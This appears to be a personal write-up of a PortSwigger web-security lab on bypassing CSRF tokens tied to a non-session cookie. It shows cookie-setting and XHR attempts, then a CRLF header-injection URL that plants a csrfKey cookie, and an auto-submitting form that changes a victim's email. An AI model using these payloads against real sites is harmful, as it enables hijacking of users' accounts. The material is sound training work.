
# CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-token-validation

- https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript

- https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies

- https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/1.png)

---------------------------------------------

First we change the email to test@test.com and find there are 2 cookies, one is “session” and the other is “csrfKey”:



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/2.png)


Then I found some code to set the value of a cookie (https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript):

```
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}

setCookie('ppkcookie','testcookie',7);
```

In our case we would change the last line to:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  
		<script>
		function setCookie(name,value,days) {
			var expires = "";
			if (days) {
				var date = new Date();
				date.setTime(date.getTime() + (days*24*60*60*1000));
				expires = "; expires=" + date.toUTCString();
			}
			document.cookie = name + "=" + (value || "")  + expires + "; path=/";
		}

		setCookie('csrfKey','Eb67I1HyfMZGN1o9KZWih0EwODxdozMg',7);
		</script>
	
	    <form action="https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

However this will not work because we need to set the Cookie header, not the cookies in the browser. We can use XHR (https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies). Then I will create a POST request in Javascript with XHR (https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest):

```
<script>

var xhr = new XMLHttpRequest();
var url = "https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net";
xhr.open('POST', url+'/my-account/change-email', true);

xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('Cookie', 'TESTING');
xhr.setRequestHeader('Cookie', 'csrfKey=Eb67I1HyfMZGN1o9KZWih0EwODxdozMg');

xhr.onload = function () {
    // do something to response
    console.log(this.responseText);
};
xhr.send('email=test12&#64;test&#46;com&csrf=V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl');

</script>
```

But this does not work either.


Checking the application again, we find the search function adds a value in the Cookie HTTP header:



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/3.png)


It is added as LastSearchTerm:



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/4.png)


Following the official solution, it is necessary to use this payload:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

- 0x0A is the newline character \n
- 0x0D is the return character \r
- Set-Cookie will change the value for the Cookie HTTP Header 


The img element will load the malicious URL and the submit the form generated by Burp:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
	  <form action="https://0a3a0029035a2e108071588100890067.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test12&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="l0RRXoovjgxMasM34eeADEMkc24whrt3" />
      <input type="submit" value="Submit request" />
      </form>
      
      <img src='https://0a3a0029035a2e108071588100890067.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=tCFA5gCGZOqAwxhYizupPrZqP7jvVE8L%3b%20SameSite=None' onerror="document.forms[0].submit()" />

  </body>
</html>
```



![img](images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/5.png)